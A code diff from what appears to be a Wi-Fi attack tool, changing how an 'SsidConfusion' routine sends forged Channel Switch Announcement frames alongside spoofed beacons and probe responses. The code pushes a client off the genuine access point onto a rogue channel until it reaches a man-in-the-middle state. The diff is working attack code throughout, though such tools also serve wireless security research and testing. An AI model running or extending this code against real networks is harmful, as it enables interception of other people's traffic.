@@ -36,6 +36,7 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     }
     probe_resp = std::make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*confused_beacon, netconfig.rogue_channel));
 
+	csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, beacon, sta.get(SK::mac));
 	Dot11Beacon legacy_beacon = expected_vht_beacon_attack::build_legacy_beacon(*beacon);
 
     // BPF: AP + client traffic only
@@ -58,7 +59,6 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
 
     const auto start      = steady_clock::now();
     auto next_beacon      = steady_clock::now();
-    int csa_cnt           = CSA_attack::CHANNEL_SWITCH_MAX;
     const uint64_t confused_beacon_ts0 = confused_beacon->timestamp();
 
     while(true) {
@@ -92,10 +92,11 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
                 static_cast<uint64_t>(duration_cast<microseconds>(steady_clock::now() - start).count()));
             send_to_rogue(*confused_beacon);
             if(client_state.get_state() < ClientState::GotMitm) {
-                send_to_real(legacy_beacon);
-                auto csa = CSA_attack::get_CSA_beacon(ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, csa_cnt, beacon.get());
-                send_to_real(csa);
-                if(--csa_cnt < 0) csa_cnt = CSA_attack::CHANNEL_SWITCH_MAX;
+                CSA_attack::update_time_CSA_frames(csa_frames);
+            	for(auto &csa_frame : csa_frames) {
+            		send_to_real(csa_frame);
+            		//interruptible_sleep(milliseconds(100)); //TODo
+            	}
             }
             next_beacon += milliseconds(beacon_ms);
         }
